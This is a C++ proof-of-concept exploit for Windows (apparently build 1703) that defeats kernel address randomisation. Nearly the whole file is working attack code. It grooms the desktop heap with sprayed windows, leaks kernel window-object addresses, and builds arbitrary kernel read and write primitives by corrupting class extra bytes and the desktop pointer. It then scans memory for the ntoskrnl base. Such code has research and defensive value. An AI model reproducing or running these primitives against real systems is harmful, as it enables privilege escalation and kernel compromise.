// tagWND_KASLR_1703.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

DWORD64 g_ulClientDelta;
DWORD64 g_rpDesk;
PDWORD64 g_fakeDesktop = NULL;
DWORD64 g_winStringAddr;
DWORD64 g_desktopHeap = 0;
DWORD64 g_desktopHeapBase = 0;
HWND g_window1 = NULL;
HWND g_window2 = NULL;
HWND g_window3 = NULL;
const WCHAR g_windowClassName1[] = L"Manager_Window";
const WCHAR g_windowClassName2[] = L"Worker_Window";
const WCHAR g_windowClassName3[] = L"Spray_Window";
WNDCLASSEX cls1;
WNDCLASSEX cls2;
WNDCLASSEX cls3;

extern "C" VOID NtUserDefSetText(HWND hwnd, PLARGE_UNICODE_STRING pstrText);

LRESULT CALLBACK WProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc3(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

VOID RtlInitLargeUnicodeString(PLARGE_UNICODE_STRING plstr, CHAR* psz, UINT cchLimit)
{
	ULONG Length;
	plstr->Buffer = (WCHAR*)psz;
	plstr->bAnsi = FALSE;
	if (psz != NULL)
	{
		plstr->Length = cchLimit;
		plstr->MaximumLength = cchLimit + sizeof(UNICODE_NULL);
	}
	else
	{
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}

BOOL setupLeak()
{
	DWORD64 teb = (DWORD64)NtCurrentTeb();
	DWORD64 win32client = teb + 0x800;
	g_desktopHeap = *(PDWORD64)(win32client + 0x28);
	g_desktopHeapBase = *(PDWORD64)(g_desktopHeap + 0x28);
	DWORD64 delta = g_desktopHeapBase - g_desktopHeap;
	g_ulClientDelta = delta;
	return TRUE;
}

DWORD64 leakWnd(HWND hwnd)
{
	DWORD i = 0;
	PDWORD64 buffer = (PDWORD64)g_desktopHeap;
	while (1)
	{
		if (buffer[i] == (DWORD64)hwnd)
		{
			return g_desktopHeapBase + i * 8;
		}
		i++;
	}
}

DWORD64 leakHeapData(DWORD64 addr)
{
	DWORD64 userAddr = addr - g_ulClientDelta;
	DWORD64 data = *(PDWORD64)userAddr;
	return data;
}

BOOL leakrpDesk(DWORD64 wndAddr)
{
	DWORD64 rpDeskuserAddr = wndAddr - g_ulClientDelta + 0x18;
	g_rpDesk = *(PDWORD64)rpDeskuserAddr;
	return TRUE;
}

BOOL createWnd()
{
	cls1.cbSize = sizeof(WNDCLASSEX);
	cls1.style = 0;
	cls1.lpfnWndProc = WProc1;
	cls1.cbClsExtra = 0x18;
	cls1.cbWndExtra = 8;
	cls1.hInstance = NULL;
	cls1.hCursor = NULL;
	cls1.hIcon = NULL;
	cls1.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls1.lpszMenuName = NULL;
	cls1.lpszClassName = g_windowClassName1;
	cls1.hIconSm = NULL;

	cls2.cbSize = sizeof(WNDCLASSEX);
	cls2.style = 0;
	cls2.lpfnWndProc = WProc2;
	cls2.cbClsExtra = 0x18;
	cls2.cbWndExtra = 8;
	cls2.hInstance = NULL;
	cls2.hCursor = NULL;
	cls2.hIcon = NULL;
	cls2.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls2.lpszMenuName = NULL;
	cls2.lpszClassName = g_windowClassName2;
	cls2.hIconSm = NULL;

	if (!RegisterClassEx(&cls2))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls3.cbSize = sizeof(WNDCLASSEX);
	cls3.style = 0;
	cls3.lpfnWndProc = WProc3;
	cls3.cbClsExtra = 0x18;
	cls3.cbWndExtra = 8;
	cls3.hInstance = NULL;
	cls3.hCursor = NULL;
	cls3.hIcon = NULL;
	cls3.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls3.lpszMenuName = NULL;
	cls3.lpszClassName = g_windowClassName3;
	cls3.hIconSm = NULL;

	if (!RegisterClassEx(&cls3))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//perform the desktop heap feng shui
	DWORD size = 0x1000;
	HWND* hWnd = new HWND[size];
	for (DWORD i = 0; i < size; i++)
	{
		hWnd[i] = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName3, L"Sprayer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
	}

	if (!RegisterClassEx(&cls1))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	g_window1 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName1, L"Manager", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window1 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	g_window2 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName2, L"Worker", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window2 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

VOID setupFakeDesktop()
{
	g_fakeDesktop = (PDWORD64)VirtualAlloc((LPVOID)0x2a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(g_fakeDesktop, 0x11, 0x1000);
}

VOID setupPrimitive()
{
	DWORD64 wndAddr = leakWnd(g_window2);
	DWORD64 wndStringAddr = wndAddr + 0xf0;
	g_winStringAddr = *(PDWORD64)(wndStringAddr - g_ulClientDelta);
	leakrpDesk(leakWnd(g_window2));
	setupFakeDesktop();
}

DWORD64 readQWORD(DWORD64 addr)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD size = 0x18;
	DWORD offset = addr & 0xF;
	addr -= offset;

	WCHAR* data = new WCHAR[size + 1];
	ZeroMemory(data, size + 1);
	g_fakeDesktop[0x10] = addr - 0x100;
	g_fakeDesktop[0x11] = 0x200;
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetClassLongPtrW(g_window1, 0x308, addr);
	SetClassLongPtrW(g_window1, 0x300, 0x0000002800000020);
	SetClassLongPtrW(g_window1, 0x230, (DWORD64)g_fakeDesktop);

	DWORD res = InternalGetWindowText(g_window2, data, size);

	SetClassLongPtrW(g_window1, 0x230, g_rpDesk);
	SetClassLongPtrW(g_window1, 0x300, 0x0000000e0000000c);
	SetClassLongPtrW(g_window1, 0x308, g_winStringAddr);

	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

	CHAR* tmp = (CHAR*)data;
	DWORD64 value = *(PDWORD64)((DWORD64)data + offset);

	return value;
}

VOID writeQWORD(DWORD64 addr, DWORD64 value)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;
	DWORD64 size = 0x8 + offset;
	CHAR* input = new CHAR[size];
	LARGE_UNICODE_STRING uStr;

	if (offset != 0)
	{
		filler = readQWORD(addr);
	}

	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (8 * i)) & 0xFF;
	}

	for (DWORD i = 0; i < 8; i++)
	{
		input[i + offset] = (value >> (8 * i)) & 0xFF;
	}

	RtlInitLargeUnicodeString(&uStr, input, size);

	g_fakeDesktop[0x1] = 0;
	g_fakeDesktop[0x10] = addr - 0x100;
	g_fakeDesktop[0x11] = 0x200;

	SetClassLongPtrW(g_window1, 0x308, addr);
	SetClassLongPtrW(g_window1, 0x300, 0x0000002800000020);
	SetClassLongPtrW(g_window1, 0x230, (DWORD64)g_fakeDesktop);

	NtUserDefSetText(g_window2, &uStr);

	SetClassLongPtrW(g_window1, 0x230, g_rpDesk);
	SetClassLongPtrW(g_window1, 0x300, 0x0000000e0000000c);
	SetClassLongPtrW(g_window1, 0x308, g_winStringAddr);
}

DWORD64 getmodBaseAddr(DWORD64 addr)
{
	DWORD64 baseAddr = 0;
	DWORD64 signature = 0x00905a4d;
	DWORD64 searchAddr = addr & 0xFFFFFFFFFFFFF000;

	while (TRUE)
	{
		DWORD64 readData = readQWORD(searchAddr);
		DWORD64 tmp = readData & 0xFFFFFFFF;
		if (tmp == signature)
		{
			baseAddr = searchAddr;
			break;
		}
		searchAddr = searchAddr - 0x1000;
	}

	return baseAddr;
}

DWORD64 leakNtBase()
{
	DWORD64 wndAddr = leakWnd(g_window1);
	DWORD64 pti = readQWORD(wndAddr + 0x10);
	DWORD64 ethread = readQWORD(pti);
	DWORD64 ntAddr = readQWORD(ethread + 0x2a8);
	DWORD64 ntBase = getmodBaseAddr(ntAddr);
	return ntBase;
}


int main()
{
	LoadLibraryA("user32.dll");

	createWnd();
	setupLeak();
	setupPrimitive();

	//Debug output buffer
	PDWORD64 buffer = (PDWORD64)VirtualAlloc((PVOID)0x1a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// This is the cbclsExtra field of the first class - manually modify it to simulate a w - w - w, 0x1000 is more than enough.
	buffer[0] = leakHeapData(leakWnd(g_window1) + 0xA8) + 0x68; //cbclsExtra
	buffer[1] = leakWnd(g_window1); //tagWND
	buffer[2] = leakHeapData(leakWnd(g_window1) + 0xA8); //tagCLS
	buffer[3] = leakWnd(g_window2); //tagWND

	DebugBreak();

	buffer[4] = leakNtBase();

	DebugBreak();

	return 0;
}

